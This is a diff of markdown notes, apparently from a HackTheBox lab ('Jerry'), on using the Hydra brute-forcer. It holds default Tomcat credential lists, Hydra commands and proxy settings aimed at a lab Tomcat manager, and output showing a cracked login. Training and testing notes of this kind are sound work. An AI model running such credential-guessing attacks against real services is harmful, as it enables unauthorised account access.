@@ -1,31 +1,28 @@
-`[Basic](#basic)
-[Hydra Common Options](#hydra-common-options)
-[Username:Password](#usernamepassword)
-[Supported Services](#supported-services)
+- [Basic](#basic)
+     - [Common Options](#common-options)
+     - [Username:Password Combination](#usernamepassword-combination)
+     - [Supported Services](#supported-services)
+- [HTTP](#http)
+     - [hydra -U http-get](#hydra--u-http-get) arrangement doesn't matter
+     - [hydra http-post-form -U](#hydra-http-post-form--u)
+     - [HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables](#use-hydra_proxy_http-or-hydra_proxy-environment-variables-for-a-proxy-setup)
+     - [Debug, send Hydra output to Burp](#to-debug-send-hydra-output-to-burp-use-this-in-the-same-line)
+     - [Common Mistakes](#common-mistakes)
+     - [Now you got it right](#now-you-got-it-right)
+     - [Common Mistakes; variables argument needed for http-post-form](#common-mistakes-variables-argument-needed-for-http-post-form)
+- [SSH](#ssh)
 
-### HTTP
 
-[hydra -U http-get](#hydra--u-http-get) arrangement doesn't matter
-[hydra http-post-form -U](#hydra-http-post-form--u)
-[HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables](#use-hydra_proxy_http-or-hydra_proxy-environment-variables-for-a-proxy-setup)
-[Debug, send Hydra output to Burp](#to-debug-send-hydra-output-to-burp-use-this-in-the-same-line)
-[Common Mistakes](#common-mistakes)
-[Now you got it right](#now-you-got-it-right)
-[Common Mistakes; variables argument needed for http-post-form](#common-mistakes-variables-argument-needed-for-http-post-form)
-
-
------------------------------------------------
-
-### Basic
+# [Basic](#basic-1)
 HTB: ???
-```
+```sh
 hydra -C creds.txt http-get://10.10.10.95:8080/manager/html
 hydra -U http-get
 hydra -C creds.txt http-get://10.10.10.95:8080/manager/html:F='Access Denied'
 ```
 
-# Hydra Common Options
-```
+## [Common Options](#common-options-1)
+```sh
 -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
 -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
 -C FILE   colon separated "login:pass" format, instead of -L/-P options
@@ -39,10 +36,10 @@ hydra -C creds.txt http-get://10.10.10.95:8080/manager/html:F='Access Denied'
 -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
 ```
 
-### Username:Password
+## [Username:Password Combination](#usernamepassword-combination-1)
 https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
 Save as: labs/htb/_BeginnerTrack/Jerry/creds.txt
-```
+```sh
 admin:password
 admin:
 ... snip ...
@@ -50,15 +47,17 @@ tomcat:admin
 tomcat:changethis
 ```
 
-### Supported Services
-```
+## [Supported Services](#supported-services-1)
+```sh
 Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
 ```
+
+# [HTTP](#http-1)
 
 ### hydra -U http-get
 hydra -U http-get
 hydra http-get -U
-```
+```sh
 $ hydra -U http-get
 Help for module http-get:
 ============================================================================
@@ -73,7 +72,7 @@ For example:  "/secret" or "http://bla.com/foo/bar:H=Cookie\: sessid=aaaa" or "h
 ```
 
 ### hydra http-post-form -U
-```
+```sh
 $ hydra http-post-form -U
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -133,7 +132,7 @@ Examples:
 ```
 
 ### Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
-```
+```sh
 $ hydra -h
 ... [snip] ...
 E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
@@ -143,14 +142,14 @@ E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
 ... [snip] ...
 ```
 
-### To debug, send Hydra output to Burp. Use this in the same line
-```
+### [To debug, send Hydra output to Burp. Use this in the same line](#to-debug-send-hydra-output-to-burp-use-this-in-the-same-line-1)
+```sh
 HYDRA_PROXY_HTTP=http://localhost:8080 hydra -C creds.txt http-get://10.10.10.95:8080/manager/html:F='Access Denied'
 ```
 
-### Common Mistakes
+### [Common Mistakes](#common-mistakes-1)
 login: admin   password: admin are not the right combination, see the help above
-```
+```sh
 $ hydra -C creds.txt http-get://10.10.10.95:8080/manager/html
 
 [DATA] attacking http-get://10.10.10.95:8080/manager/html
@@ -160,19 +159,18 @@ $ hydra -C creds.txt http-get://10.10.10.95:8080/manager/html
 
 ```
 
-### Now you got it right
-```
+### [Now you got it right](#now-you-got-it-right-1)
+```sh
 $ hydra -C creds.txt http-get://10.10.10.95:8080/manager/html:F='Access Denied'
 
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries, ~2 tries per task
 [DATA] attacking http-get://10.10.10.95:8080/manager/html:F=Access Denied
 [8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret
 1 of 1 target successfully completed, 1 valid password found
-
 ```
 
-### Common Mistakes; variables argument needed for http-post-form
-```
+### [Common Mistakes; variables argument needed for http-post-form](#common-mistakes-variables-argument-needed-for-http-post-form-1)
+```sh
 $ hydra http-post-form://$ip
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -186,6 +184,8 @@ Syntax: <url>:<form parameters>[:<optional>[:<optional>]:<condition string>
 ```
 
 ```
+
+# [SSH](#ssh-1)
 
 ### 
 ```
